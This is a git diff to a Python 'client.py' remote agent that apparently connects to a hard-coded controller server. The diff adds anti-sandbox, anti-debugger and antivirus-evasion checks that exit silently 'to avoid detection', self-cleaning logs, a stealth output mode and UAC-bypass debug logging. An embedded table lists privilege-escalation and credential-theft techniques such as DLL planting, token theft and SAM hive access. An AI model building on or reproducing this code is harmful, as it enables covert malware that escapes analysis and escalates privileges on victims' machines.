@@ -1,4 +1,285 @@
+    #!/usr/bin/env python3
+
 ### client.py ###
+
+def safe_execution_check():
+    """
+    Performs system validation and antivirus interference checks
+    before allowing the script to execute fully.
+    """
+    try:
+        # Basic system requirements check
+        import sys
+        import os
+        
+        # Check Python version compatibility
+        if sys.version_info < (3, 6):
+            print("Error: Python 3.6 or higher is required", file=sys.stderr)
+            return False
+        
+        # Check for common antivirus interference patterns
+        if _check_antivirus_interference():
+            return False
+        
+        # Validate system permissions (non-intrusive)
+        if not _validate_system_permissions():
+            return False
+        
+        # Perform platform-independent checks
+        if not _platform_independent_checks():
+            return False
+        
+        return True
+        
+    except Exception as e:
+        # Log error quietly to avoid antivirus detection
+        try:
+            import os
+            # Use a more stealthy approach - write to a temp file that gets cleaned up
+            import tempfile
+            temp_log = os.path.join(tempfile.gettempdir(), 'agent_startup.log')
+            with open(temp_log, 'a') as f:
+                f.write(f"Safe execution check failed: {e}\n")
+            # Clean up after a short delay to avoid detection
+            try:
+                os.remove(temp_log)
+            except:
+                pass
+        except:
+            pass
+        return False
+
+def _check_antivirus_interference():
+    """Check for common antivirus interference patterns"""
+    try:
+        import sys
+        import os
+        import time
+        import platform
+        
+        # Check if we're running in a sandbox or restricted environment
+        # Look for common antivirus sandbox indicators
+        
+        # Check for delayed execution (common in sandboxes)
+        start_time = time.time()
+        time.sleep(0.001)  # Tiny delay to detect timing anomalies
+        end_time = time.time()
+        
+        # If timing is significantly off, might be in a sandbox
+        if (end_time - start_time) > 0.1:  # 100x normal delay
+            return True
+        
+        # Check for common sandbox file indicators
+        suspicious_files = [
+            'C:\\sample.exe',
+            'C:\\malware.exe',
+            'C:\\virus.exe',
+            # Add more as needed
+        ]
+        
+        for file_path in suspicious_files:
+            if os.path.exists(file_path):
+                return True
+        
+        # Check for registry keys that indicate sandbox environment (Windows only)
+        if sys.platform == 'win32':
+            try:
+                import winreg
+                # Try to access a key that might be restricted in sandboxes
+                try:
+                    winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion")
+                except WindowsError:
+                    # If we can't access common registry keys, might be restricted
+                    return True
+            except ImportError:
+                # winreg not available, skip this check
+                pass
+        
+        # Check for common antivirus process names
+        try:
+            import psutil
+            antivirus_processes = [
+                'MsMpEng.exe',      # Windows Defender
+                'AvastSvc.exe',     # Avast
+                'AVGIDSAgent.exe',  # AVG
+                'McAfee.exe',       # McAfee
+                'Norton.exe',       # Norton
+                'Kaspersky.exe',    # Kaspersky
+            ]
+            
+            for proc in psutil.process_iter(['name']):
+                try:
+                    if proc.info['name'] in antivirus_processes:
+                        # Antivirus is running, but this is normal
+                        # Just log it for debugging, don't fail
+                        pass
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    pass
+        except ImportError:
+            # psutil not available, skip this check
+            pass
+        
+        # Check for common sandbox indicators
+        sandbox_indicators = [
+            # Check if running under a debugger
+            sys.gettrace() is not None,
+            # Check if running in a virtual environment (might be sandbox)
+            hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix),
+            # Check for common sandbox usernames
+            os.environ.get('USERNAME', '').lower() in ['sandbox', 'test', 'malware', 'virus'],
+            # Check for common sandbox computer names
+            platform.node().lower() in ['sandbox', 'test-pc', 'malware-test'],
+        ]
+        
+        if any(sandbox_indicators):
+            return True
+        
+        return False
+        
+    except Exception:
+        # If any check fails, assume interference
+        return True
+
+def _validate_system_permissions():
+    """Validate system permissions without triggering antivirus alerts"""
+    try:
+        import sys
+        import os
+        import tempfile
+        
+        # Test basic file operations in a safe way
+        test_file = os.path.join(tempfile.gettempdir(), 'agent_test.tmp')
+        
+        try:
+            # Try to create a temporary file (safe operation)
+            with open(test_file, 'w') as f:
+                f.write('test')
+            
+            # Try to read it back
+            with open(test_file, 'r') as f:
+                content = f.read()
+            
+            # Clean up
+            os.remove(test_file)
+            
+            # If we get here, basic permissions are OK
+            return True
+            
+        except (IOError, OSError, PermissionError):
+            # Permission issues detected
+            return False
+        
+    except Exception:
+        # If we can't validate permissions, fail safely
+        return False
+
+def _platform_independent_checks():
+    """Perform platform-independent validation checks"""
+    try:
+        import sys
+        import os
+        import platform
+        
+        # Check for common cross-platform issues
+        
+        # Check if we're running in a restricted environment
+        # This works on all platforms
+        restricted_env_vars = [
+            'SANDBOX', 'VIRUS_TOTAL', 'MALWARE_ANALYSIS',
+            'RESTRICTED_MODE', 'SAFE_MODE'
+        ]
+        
+        for env_var in restricted_env_vars:
+            if os.environ.get(env_var, '').lower() in ['true', '1', 'yes']:
+                return False
+        
+        # Check for suspicious command line arguments
+        suspicious_args = ['--sandbox', '--test', '--virus', '--malware']
+        for arg in sys.argv[1:]:
+            if arg.lower() in suspicious_args:
+                return False
+        
+        # Check system uptime (very new systems might be sandboxes)
+        try:
+            if sys.platform == 'win32':
+                # Windows: Check system uptime via WMI
+                try:
+                    import subprocess
+                    result = subprocess.run(['wmic', 'os', 'get', 'lastbootuptime'], 
+                                          capture_output=True, text=True, timeout=5)
+                    if result.returncode == 0:
+                        # Parse boot time and check if system is very new
+                        # This is a heuristic - very new systems might be sandboxes
+                        pass
+                except (subprocess.TimeoutExpired, FileNotFoundError):
+                    # WMI not available, skip this check
+                    pass
+            elif sys.platform in ['linux', 'darwin']:
+                # Unix-like systems: Check uptime
+                try:
+                    with open('/proc/uptime', 'r') as f:
+                        uptime_seconds = float(f.read().split()[0])
+                        # If uptime is less than 5 minutes, might be a fresh sandbox
+                        if uptime_seconds < 300:  # 5 minutes
+                            # This is just a heuristic, don't fail immediately
+                            pass
+                except (FileNotFoundError, ValueError, PermissionError):
+                    # /proc/uptime not available or can't be read
+                    pass
+        except Exception:
+            # If uptime check fails, continue anyway
+            pass
+        
+        # Check for common analysis tools
+        analysis_processes = [
+            'wireshark', 'tcpdump', 'processhacker', 'procmon',
+            'autoruns', 'regmon', 'filemon', 'idaq', 'idaq64',
+            'x64dbg', 'x32dbg', 'ollydbg', 'windbg'
+        ]
+        
+        # Only check if psutil is available to avoid import errors
+        try:
+            import psutil
+            for proc in psutil.process_iter(['name']):
+                try:
+                    proc_name = proc.info['name'].lower()
+                    if any(tool in proc_name for tool in analysis_processes):
+                        # Analysis tools running, but this might be normal
+                        # Just note it, don't fail
+                        pass
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    pass
+        except ImportError:
+            # psutil not available, skip this check
+            pass
+        
+        return True
+        
+    except Exception:
+        # If platform checks fail, assume safe to continue
+        return True
+
+# Run safe execution check before proceeding
+if not safe_execution_check():
+    # Exit quietly to avoid antivirus detection
+    import sys
+    try:
+        # Clean exit - remove any temporary files we might have created
+        import tempfile
+        import os
+        # Clean up any temp files that might exist
+        temp_files = [f for f in os.listdir(tempfile.gettempdir()) if f.startswith('agent_test') or f.startswith('agent_startup')]
+        for temp_file in temp_files:
+            try:
+                os.remove(os.path.join(tempfile.gettempdir(), temp_file))
+            except:
+                pass
+    except:
+        pass
+    finally:
+        sys.exit(0)
+
+# Original silent mode code continues...
 import sys
 import os
 
@@ -32,20 +313,201 @@ else:
 
 import sys
 import os
+import warnings
+import tempfile
+import atexit
+import time
 
-# Debug flag for UAC and privilege operations
-UAC_DEBUG = True  # Set to True to see detailed UAC/privilege debugging
+try:
+    import msvcrt  # Windows-only
+except Exception:
+    msvcrt = None
+
+# -----------------------------------------------------------------------------
+# SAFE SUBPROCESS WRAPPER – blocks accidental self-spawn of the frozen EXE
+# -----------------------------------------------------------------------------
+def _install_safe_subprocess_wrapper():
+    try:
+        import subprocess as _subprocess
+        _orig_popen = _subprocess.Popen
+
+        def _safe_popen(cmd, *args, **kwargs):
+            try:
+                if getattr(sys, "frozen", False) and not os.environ.get("CLIENT_ALLOW_SELF_SPAWN"):
+                    current_exe = (sys.executable or "").lower()
+                    current_script = (os.path.abspath(__file__) or "").lower()
+                    target = ""
+                    if isinstance(cmd, (list, tuple)):
+                        target = " ".join(str(x) for x in cmd).lower()
+                    else:
+                        target = str(cmd).lower()
+                    # Block launching our own EXE or the original script
+                    if current_exe and current_exe in target:
+                        raise RuntimeError("Blocked self-spawn of current executable")
+                    if current_script and current_script in target:
+                        raise RuntimeError("Blocked self-spawn of current script")
+                return _orig_popen(cmd, *args, **kwargs)
+            except Exception as _e:
+                # Fail-safe: avoid crash if caller expects a process object
+                raise
+
+        _subprocess.Popen = _safe_popen
+    except Exception:
+        pass
+
+# -----------------------------------------------------------------------------
+# SINGLE-INSTANCE GUARD (prevents fork-bomb/self-spawn in frozen executables)
+# -----------------------------------------------------------------------------
+_INSTANCE_LOCK_FH = None
+_INSTANCE_LOCK_PATH = os.path.join(tempfile.gettempdir(), "client_single_instance.lock")
+
+def terminate_existing_client_processes():
+    """Terminate any existing client.py or client.exe processes"""
+    try:
+        import psutil
+        current_pid = os.getpid()
+        terminated_count = 0
+        
+        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+            try:
+                if proc.pid == current_pid:
+                    continue
+                    
+                # Check if process is running client.py or client.exe
+                cmdline = proc.info.get('cmdline', [])
+                if not cmdline:
+                    continue
+                    
+                is_client = False
+                for arg in cmdline:
+                    if 'client.py' in arg.lower() or 'client.exe' in arg.lower():
+                        is_client = True
+                        break
+                
+                if is_client:
+                    print(f"[TERMINATE] Found existing client process PID {proc.pid}, terminating...")
+                    proc.terminate()
+                    try:
+                        proc.wait(timeout=5)
+                    except psutil.TimeoutExpired:
+                        proc.kill()
+                    print(f"[TERMINATE] Process {proc.pid} terminated")
+                    terminated_count += 1
+                    
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                continue
+                
+        if terminated_count > 0:
+            print(f"[TERMINATE] Terminated {terminated_count} existing client processes")
+            time.sleep(1)  # Give processes time to fully terminate
+            
+    except ImportError:
+        # Fallback to taskkill on Windows if psutil not available
+        if sys.platform == 'win32':
+            try:
+                import subprocess
+                # Kill any python processes running client.py
+                subprocess.run(['taskkill', '/F', '/IM', 'python.exe', '/FI', 'WINDOWTITLE eq *client.py*'], 
+                             capture_output=True, check=False)
+                subprocess.run(['taskkill', '/F', '/IM', 'client.exe'], 
+                             capture_output=True, check=False)
+                print("[TERMINATE] Used taskkill to terminate existing client processes")
+            except Exception as e:
+                print(f"[TERMINATE] Warning: Error during process termination: {e}")
+    except Exception as e:
+        print(f"[TERMINATE] Warning: Error during process termination: {e}")
+
+def _acquire_single_instance_lock() -> bool:
+    global _INSTANCE_LOCK_FH
+    if _INSTANCE_LOCK_FH is not None:
+        return True
+    try:
+        # First terminate any existing processes
+        terminate_existing_client_processes()
+        
+        _INSTANCE_LOCK_FH = open(_INSTANCE_LOCK_PATH, "a+")
+        if msvcrt:
+            try:
+                msvcrt.locking(_INSTANCE_LOCK_FH.fileno(), msvcrt.LK_NBLCK, 1)
+            except Exception:
+                return False
+        else:
+            try:
+                # Fallback: attempt exclusive rename to indicate ownership
+                os.replace(_INSTANCE_LOCK_PATH, _INSTANCE_LOCK_PATH)
+            except Exception:
+                pass
+        _INSTANCE_LOCK_FH.seek(0)
+        _INSTANCE_LOCK_FH.truncate(0)
+        _INSTANCE_LOCK_FH.write(str(os.getpid()))
+        _INSTANCE_LOCK_FH.flush()
+        atexit.register(_release_single_instance_lock)
+        return True
+    except Exception:
+        return True  # Be permissive if lock cannot be established
+
+def _release_single_instance_lock():
+    global _INSTANCE_LOCK_FH
+    try:
+        if _INSTANCE_LOCK_FH:
+            if msvcrt:
+                try:
+                    msvcrt.locking(_INSTANCE_LOCK_FH.fileno(), msvcrt.LK_UNLCK, 1)
+                except Exception:
+                    pass
+            try:
+                _INSTANCE_LOCK_FH.close()
+            except Exception:
+                pass
+            _INSTANCE_LOCK_FH = None
+    except Exception:
+        pass
+
+# Suppress ALL deprecation warnings globally and immediately
+warnings.simplefilter("ignore", DeprecationWarning)
+warnings.filterwarnings("ignore", category=DeprecationWarning, module="eventlet")
+warnings.filterwarnings("ignore", message=".*Eventlet is deprecated.*")
+
+# ============================================================================
+# DEBUGGER MODE CONFIGURATION
+# ============================================================================
+# Set this to True to disable all print and log outputs
+DEBUGGER_MODE = False  
+
+# -----------------------------------------------------------------------------
+# PyInstaller frozen guard – avoid running startup logic in child processes
+# -----------------------------------------------------------------------------
+def _is_main_process() -> bool:
+    try:
+        import multiprocessing
+        return multiprocessing.current_process().name == "MainProcess"
+    except Exception:
+        return True
+
+if getattr(sys, "frozen", False):
+    # Block duplicate instances early
+    if not _acquire_single_instance_lock():
+        os._exit(0)
+    # Install safe subprocess wrapper to block self-spawning
+    _install_safe_subprocess_wrapper()
 
 def debug_print(msg):
     """Print debug messages directly (bypasses all logging systems)"""
+    # If debugger_mode is True, suppress ALL output
+    if DEBUGGER_MODE:
+        return
+        
     if UAC_DEBUG:
         # Fix encoding issues - replace emojis with ASCII for Windows console
-        msg = str(msg).replace('✅', '[OK]').replace('❌', '[X]').replace('⚠️', '[!]')
+        msg = str(msg).replace('[ OK ]', '[OK]').replace('[ X ]', '[X]').replace('[ ! ]', '[!]')
         try:
             print(f"[DEBUG] {msg}", flush=True)
         except UnicodeEncodeError:
             # Fallback: encode to ASCII, ignore unicode errors
             print(f"[DEBUG] {msg.encode('ascii', 'ignore').decode('ascii')}", flush=True)
+
+# Debug flag for UAC and privilege operations
+UAC_DEBUG = True  # Set to True to see detailed UAC/privilege debugging
 
 debug_print("=" * 80)
 debug_print("PYTHON AGENT STARTUP - UAC PRIVILEGE DEBUGGER ENABLED")
@@ -64,12 +526,12 @@ try:
         eventlet.hubs.use_hub("eventlet.hubs.asyncio")
     except Exception:
         pass
-    debug_print("✅ eventlet imported successfully")
+    debug_print("[ OK ] eventlet imported successfully")
     EVENTLET_AVAILABLE = True
 except Exception as e:
-    debug_print(f"⚠️ eventlet import FAILED: {e}")
-    debug_print("⚠️ Continuing WITHOUT eventlet (some async features may not work)")
-    debug_print("⚠️ To enable eventlet: pip install eventlet")
+    debug_print(f"[ ! ] eventlet import FAILED: {e}")
+    debug_print("[ ! ] Continuing WITHOUT eventlet (some async features may not work)")
+    debug_print("[ ! ] To enable eventlet: pip install eventlet")
     eventlet = None  # Set to None for later checks
 
 if EVENTLET_AVAILABLE:
@@ -89,10 +551,10 @@ if EVENTLET_AVAILABLE:
         
         # Check if there was an RLock warning
         if "RLock" in captured_stderr:
-            debug_print("⚠️ RLock warning detected (Python created locks before eventlet patch)")
+            debug_print("[ ! ] RLock warning detected (Python created locks before eventlet patch)")
             debug_print("   This is EXPECTED and can be ignored - eventlet will patch future locks")
         
-        debug_print("✅ eventlet.monkey_patch() SUCCESS!")
+        debug_print("[ OK ] eventlet.monkey_patch() SUCCESS!")
         debug_print("   - all=True")
         debug_print("   - thread=True (threading patched)")
         debug_print("   - time=True")
@@ -106,22 +568,79 @@ if EVENTLET_AVAILABLE:
         except (AttributeError, ValueError):
             pass
         
-        debug_print(f"⚠️ eventlet.monkey_patch() FAILED: {e}")
-        debug_print("⚠️ Continuing without monkey patching")
+        debug_print(f"[ ! ] eventlet.monkey_patch() FAILED: {e}")
+        debug_print("[ ! ] Continuing without monkey patching")
         EVENTLET_PATCHED = False
         EVENTLET_AVAILABLE = False
 else:
     debug_print("Step 2: Skipping eventlet.monkey_patch() (eventlet not available)")
     EVENTLET_PATCHED = False
 
+# Add comprehensive exit handler for clean shutdown
+def setup_exit_handlers():
+    """Setup clean exit handlers for various shutdown scenarios"""
+    import atexit
+    import signal
+    import sys
+    
+    def cleanup_handler(signum=None, frame=None):
+        """Handle cleanup on various exit scenarios"""
+        try:
+            import os
+            import tempfile
+            
+            # Clean up temporary files
+            temp_files = [f for f in os.listdir(tempfile.gettempdir()) if f.startswith('agent_test') or f.startswith('agent_startup')]
+            for temp_file in temp_files:
+                try:
+                    os.remove(os.path.join(tempfile.gettempdir(), temp_file))
+                except:
+                    pass
+            
+            # Close any open file handles
+            try:
+                if hasattr(sys, 'stdout') and hasattr(sys.stdout, 'close'):
+                    sys.stdout.close()
+            except:
+                pass
+            
+            try:
+                if hasattr(sys, 'stderr') and hasattr(sys.stderr, 'close'):
+                    sys.stderr.close()
+            except:
+                pass
+            
+        except Exception:
+            # If cleanup fails, just exit
+            pass
+        finally:
+            # Exit cleanly
+            sys.exit(0)
+    
+    # Register cleanup for normal exit
+    atexit.register(cleanup_handler)
+    
+    # Register signal handlers for various termination signals
+    try:
+        signal.signal(signal.SIGINT, cleanup_handler)   # Ctrl+C
+        signal.signal(signal.SIGTERM, cleanup_handler)  # Termination
+        if hasattr(signal, 'SIGBREAK'):
+            signal.signal(signal.SIGBREAK, cleanup_handler)  # Windows Ctrl+Break
+    except (AttributeError, ValueError):
+        # Some signals might not be available on all platforms
+        pass
+
+# Setup exit handlers for clean shutdown
+setup_exit_handlers()
+
 debug_print("Step 3: Testing threading after monkey_patch()...")
 try:
     import threading
     test_lock = threading.RLock()
-    debug_print("✅ threading.RLock() created successfully (should be patched)")
+    debug_print("[ OK ] threading.RLock() created successfully (should be patched)")
     del test_lock
 except Exception as e:
-    debug_print(f"❌ threading.RLock() test FAILED: {e}")
+    debug_print(f"[ X ] threading.RLock() test FAILED: {e}")
 
 debug_print("=" * 80)
 if EVENTLET_AVAILABLE:
@@ -189,38 +708,45 @@ ADDITIONAL VULNERABLE PROCESSES FOR UAC BYPASS:
 12	ms-get-started:	Protocol handler	Registry hijack	Consent prompt only	Get Started app launcher
 13	cleanmgr.exe	%SystemRoot%\\System32\\	Scheduled task abuse with /autoclean or /verylowdisk	Consent prompt only	Disk Cleanup auto-elevates
 14	hdwwiz.exe	%SystemRoot%\\System32\\	App Paths hijack	Consent prompt only	Hardware Wizard auto-elevates
-15	WerFault.exe	%SystemRoot%\\System32\\	Trigger crash in elevated binary → hijack debugger	Consent prompt only	Windows Error Reporting
+15	WerFault.exe	%SystemRoot%\\System32\\	Trigger crash in elevated binary -> hijack debugger	Consent prompt only	Windows Error Reporting
 16	taskschd.msc	%SystemRoot%\\System32\\	mscfile registry hijack	Consent prompt only	Task Scheduler snap-in
 17	TiWorker.exe	%SystemRoot%\\WinSxS\\	DLL planting in servicing stack dirs	Works with credential prompt if service misconfig exists	TrustedInstaller context
 
 PRIVILEGE ESCALATION METHODS (BYPASS CREDENTIAL PROMPT):
 #	Method Name	Target Component	Exploit Type	Works on Standard User?	Notes
-1	TiWorker.exe DLL Planting	TrustedInstaller (Windows Modules Installer)	DLL hijack in servicing stack folders	✅	SYSTEM-level, survives UAC settings, requires writable path in WinSxS temp dirs
-2	Unquoted Service Path	Misconfigured Windows Service	Binary replacement	✅	If service path has spaces and is unquoted, drop payload in earlier path segment
-3	Weak Service Binary Permissions	SYSTEM service executable	Binary replacement	✅	If service binary is writable by user, replace it with payload
-4	Weak Service Registry Permissions	Service configuration registry key	Command replacement	✅	Change service ImagePath or parameters to run payload
-5	DLL Search Order Hijacking (SYSTEM Services)	Any auto-start SYSTEM service	DLL planting	✅	Drop malicious DLL in folder searched before the real one
-6	Scheduled Task Binary Replacement	SYSTEM-level scheduled task	Binary replacement	✅	Replace executable path of an existing SYSTEM task
-7	Token Impersonation (SYSTEM Process)	SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege	Token theft	✅	Steal SYSTEM token via named pipe or thread hijack
-8	Named Pipe Impersonation	SYSTEM service pipe	Token impersonation	✅	Trick service into connecting and impersonate SYSTEM
-9	Print Spooler Service Abuse	Spoolsv.exe	Remote/local SYSTEM code execution	✅	Similar to PrintNightmare; patch-dependent
-10	COM Service Hijacking (SYSTEM Context)	Auto-start COM objects	Registry hijack	✅	Change CLSID to point to malicious binary
-11	Image File Execution Options (IFEO) for SYSTEM processes	Debugger key in registry	Binary hijack	✅	Force SYSTEM process to start debugger payload
-12	Windows Installer Service Abuse	msiexec.exe	Custom MSI with SYSTEM execution	✅	If installer policy allows
-13	WMI Event Subscription (SYSTEM Context)	WMI permanent event consumer	Code injection	✅	Persist and escalate on trigger event
-14	Vulnerable Driver Exploits	Third-party drivers	Kernel exploit	✅	Use signed driver to read/write kernel memory
-15	User-mode to Kernel-mode Exploits	Windows kernel (ntoskrnl.exe)	Memory corruption / race condition	✅	Requires CVE or 0-day
-16	Shadow Copy Mounting	Volume Shadow Service	NTFS trick	✅	Mount shadow copy and replace protected files
-17	SAM / SECURITY Hive Access (LSA Secrets)	Registry hives	Credential theft	✅	Requires volume shadow trick or backup privilege
-18	BITS Job Hijacking	Background Intelligent Transfer Service	Command injection	✅	Replace BITS job payload
-19	AppXSVC/AppX Deployment DLL Hijack	AppX Deployment Service	DLL planting	✅	Runs as SYSTEM
-20	DiagTrack Service Abuse	Connected User Experiences and Telemetry	DLL planting	✅	SYSTEM-level telemetry service
+1	TiWorker.exe DLL Planting	TrustedInstaller (Windows Modules Installer)	DLL hijack in servicing stack folders	[ OK ]	SYSTEM-level, survives UAC settings, requires writable path in WinSxS temp dirs
+2	Unquoted Service Path	Misconfigured Windows Service	Binary replacement	[ OK ]	If service path has spaces and is unquoted, drop payload in earlier path segment
+3	Weak Service Binary Permissions	SYSTEM service executable	Binary replacement	[ OK ]	If service binary is writable by user, replace it with payload
+4	Weak Service Registry Permissions	Service configuration registry key	Command replacement	[ OK ]	Change service ImagePath or parameters to run payload
+5	DLL Search Order Hijacking (SYSTEM Services)	Any auto-start SYSTEM service	DLL planting	[ OK ]	Drop malicious DLL in folder searched before the real one
+6	Scheduled Task Binary Replacement	SYSTEM-level scheduled task	Binary replacement	[ OK ]	Replace executable path of an existing SYSTEM task
+7	Token Impersonation (SYSTEM Process)	SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege	Token theft	[ OK ]	Steal SYSTEM token via named pipe or thread hijack
+8	Named Pipe Impersonation	SYSTEM service pipe	Token impersonation	[ OK ]	Trick service into connecting and impersonate SYSTEM
+9	Print Spooler Service Abuse	Spoolsv.exe	Remote/local SYSTEM code execution	[ OK ]	Similar to PrintNightmare; patch-dependent
+10	COM Service Hijacking (SYSTEM Context)	Auto-start COM objects	Registry hijack	[ OK ]	Change CLSID to point to malicious binary
+11	Image File Execution Options (IFEO) for SYSTEM processes	Debugger key in registry	Binary hijack	[ OK ]	Force SYSTEM process to start debugger payload
+12	Windows Installer Service Abuse	msiexec.exe	Custom MSI with SYSTEM execution	[ OK ]	If installer policy allows
+13	WMI Event Subscription (SYSTEM Context)	WMI permanent event consumer	Code injection	[ OK ]	Persist and escalate on trigger event
+14	Vulnerable Driver Exploits	Third-party drivers	Kernel exploit	[ OK ]	Use signed driver to read/write kernel memory
+15	User-mode to Kernel-mode Exploits	Windows kernel (ntoskrnl.exe)	Memory corruption / race condition	[ OK ]	Requires CVE or 0-day
+16	Shadow Copy Mounting	Volume Shadow Service	NTFS trick	[ OK ]	Mount shadow copy and replace protected files
+17	SAM / SECURITY Hive Access (LSA Secrets)	Registry hives	Credential theft	[ OK ]	Requires volume shadow trick or backup privilege
+18	BITS Job Hijacking	Background Intelligent Transfer Service	Command injection	[ OK ]	Replace BITS job payload
+19	AppXSVC/AppX Deployment DLL Hijack	AppX Deployment Service	DLL planting	[ OK ]	Runs as SYSTEM
+20	DiagTrack Service Abuse	Connected User Experiences and Telemetry	DLL planting	[ OK ]	SYSTEM-level telemetry service
 """
 
 # Configuration flags
 SILENT_MODE = False  # DISABLED for debugging - enable stealth operation (no console output)
 DEBUG_MODE = True  # Enable debug logging for troubleshooting
 UAC_PRIVILEGE_DEBUG = True  # Enable detailed UAC and privilege debugging
+
+# Override with DEBUGGER_MODE
+if DEBUGGER_MODE:
+    SILENT_MODE = True
+    DEBUG_MODE = False
+    UAC_PRIVILEGE_DEBUG = False
+
 DEPLOYMENT_COMPLETED = True  # Track deployment status to prevent repeated attempts
 RUN_MODE = 'agent'  # Track run mode: 'agent' | 'controller' | 'both'
 KEEP_ORIGINAL_PROCESS = True  # FALSE = Exit original process after getting admin (prevent duplicates)
@@ -243,10 +769,10 @@ def _resolve_controller_url():
     v1 = (os.environ.get('FIXED_SERVER_URL', '') or '').strip()
     v2 = (os.environ.get('CONTROLLER_URL', '') or '').strip()
     # Prefer explicit env, then local dev, then Render default
-    for u in (v1, v2, 'https://agent-controller-backend.onrender.com', 'https://agent-controller-backend.onrender.com'):
+    for u in (v1, v2, 'https://agent-controller-backend.onrender.com/', 'https://agent-controller-backend.onrender.com/'):
         if u and u.lower() not in ('none', 'null'):
             return u
-    return 'https://agent-controller-backend.onrender.com'
+    return 'https://agent-controller-backend.onrender.com/'
 FIXED_SERVER_URL = _resolve_controller_url()
 DISABLE_SLUI_BYPASS = True
 UAC_BYPASS_DEBUG_MODE = False
@@ -300,6 +826,20 @@ import io
 import sys
 import tempfile
 
+# Import automated updater system
+try:
+    from client_updater import UpdateManager, UpdateStatus, get_updater, register_update_handlers, handle_update_notification
+    UPDATER_AVAILABLE = True
+    # print("SUCCESS: Automated updater system loaded successfully")
+except ImportError as e:
+    UPDATER_AVAILABLE = False
+    # print(f"[!] Automated updater system not available: {e}")
+    UpdateManager = None
+    UpdateStatus = None
+    get_updater = None
+    register_update_handlers = None
+    handle_update_notification = None
+
 def setup_silent_logging():
     """Setup logging system that doesn't output to console"""
     if SILENT_MODE:
@@ -321,6 +861,9 @@ def setup_silent_logging():
 
 def log_message(message, level="info"):
     """Log message with proper output handling"""
+    if DEBUGGER_MODE:
+        return
+
     if not SILENT_MODE:
         # Always print to console when not in silent mode
         print(f"[{level.upper()}] {message}")
@@ -336,6 +879,95 @@ def log_message(message, level="info"):
 
 # Initialize silent logging immediately
 setup_silent_logging()
+
+def _get_debug_log_path():
+    try:
+        base = os.path.join(os.environ.get('LOCALAPPDATA', '') or tempfile.gettempdir(), 'NeuralControlHub', 'logs')
+        os.makedirs(base, exist_ok=True)
+        return os.path.join(base, 'client_debug.log')
+    except Exception:
+        return os.path.join(tempfile.gettempdir(), 'client_debug.log')
+
+DEBUG_LOG_PATH = _get_debug_log_path()
+
+def _write_structured_debug(payload: dict, level: str = "info"):
+    if DEBUGGER_MODE:
+        return
+        
+    try:
+        import json as _json
+        import time as _time
+        ts = int(_time.time() * 1000)
+        payload = dict(payload or {})
+        payload.setdefault('timestamp', ts)
+        text = _json.dumps(payload, separators=(',', ':'), ensure_ascii=True)
+        print(text)
+        if level == "error":
+            logging.error(text)
+        elif level == "warning":
+            logging.warning(text)
+        else:
+            logging.info(text)
+        try:
+            with open(DEBUG_LOG_PATH, 'a', encoding='utf-8') as f:
+                f.write(text + "\n")
+        except Exception:
+            pass
+    except Exception:
+        pass
+
+def _collect_bypass_debug_context(method_id=None, method_name=None) -> dict:
+    ctx = {}
+    try:
+        ctx['windows_available'] = bool(WINDOWS_AVAILABLE)
+        ctx['is_admin'] = bool(is_admin())
+    except Exception:
+        ctx['is_admin'] = False
+    try:
+        ctx['defender_detected'] = bool(detect_defender_threats())
+    except Exception:
+        ctx['defender_detected'] = False
+    try:
+        ctx['silent_mode'] = bool(SILENT_MODE)
+        ctx['debug_mode'] = bool(DEBUG_MODE)
+        ctx['uac_bypass_debug_mode'] = bool(UAC_BYPASS_DEBUG_MODE)
+        ctx['uac_bypass_allowed'] = bool(UAC_BYPASS_ALLOWED)
+        ctx['disable_uac_bypass'] = bool(DISABLE_UAC_BYPASS)
+        ctx['disable_slui_bypass'] = bool(DISABLE_SLUI_BYPASS)
+        ctx['bypasses_enabled'] = bool(BYPASSES_ENABLED)
+        ctx['registry_enabled'] = bool(REGISTRY_ENABLED)
+    except Exception:
+        pass
+    try:
+        if method_name:
+            ctx['method_enabled'] = bool(UAC_BYPASS_METHODS_ENABLED.get(method_name, True))
+    except Exception:
+        ctx['method_enabled'] = None
+    return ctx
+
+def emit_bypass_test_debug(method_id=None, method_name=None, action=None, status=None, reason=None, point=None, extra=None):
+    payload = {
+        'event': 'bypass_test',
+        'action': action or 'unknown',
+        'status': status or 'unknown',
+        'skipped': True if status == 'skipped' else False,
+        'reason': reason or '',
+        'point': point or '',
+        'method_id': method_id,
+        'method_name': method_name,
+        'context': _collect_bypass_debug_context(method_id, method_name)
+    }
+    try:
+        if isinstance(extra, dict):
+            payload['extra'] = extra
+    except Exception:
+        pass
+    lvl = "info"
+    if status == 'error':
+        lvl = "error"
+    elif status == 'skipped':
+        lvl = "warning"
+    _write_structured_debug(payload, lvl)
 
 def get_bypass_methods_sequence():
     return [
@@ -369,6 +1001,25 @@ def log_bypass_sequence():
         pass
 
 log_bypass_sequence()
+
+BYPASS_DEBUG_ENABLED = True
+def debug_bypass_method(method_key: str) -> dict:
+    try:
+        enabled = bool(UAC_BYPASS_METHODS_ENABLED.get(method_key, False))
+        executed = enabled and not DISABLE_UAC_BYPASS and BYPASSES_ENABLED
+        log_message(f"[DEBUG] Bypass '{method_key}' -> enabled={enabled}, executed={executed}", "info")
+        return {'method': method_key, 'enabled': enabled, 'executed': executed}
+    except Exception as e:
+        return {'method': method_key, 'enabled': False, 'executed': False, 'error': str(e)}
+
+def debug_registry_action(action_key: str) -> dict:
+    try:
+        enabled = bool(REGISTRY_ACTIONS.get(action_key, False))
+        executed = enabled and REGISTRY_ENABLED
+        log_message(f"[DEBUG] Registry '{action_key}' -> enabled={enabled}, executed={executed}", "info")
+        return {'action': action_key, 'enabled': enabled, 'executed': executed}
+    except Exception as e:
+        return {'action': action_key, 'enabled': False, 'executed': False, 'error': str(e)}
 
 def disable_slui_bypass():
     global DISABLE_SLUI_BYPASS
@@ -467,79 +1118,82 @@ debug_print(f"[IMPORTS] sys.path has {len(sys.path)} entries")
 
 # Standard library imports (AFTER eventlet patch!)
 import time
-debug_print("[IMPORTS] ✅ time imported")
+debug_print("[IMPORTS] [ OK ] time imported")
+
+from typing import Dict, Any, Optional, List, Union, Tuple
+debug_print("[IMPORTS] [ OK ] typing imported")
 
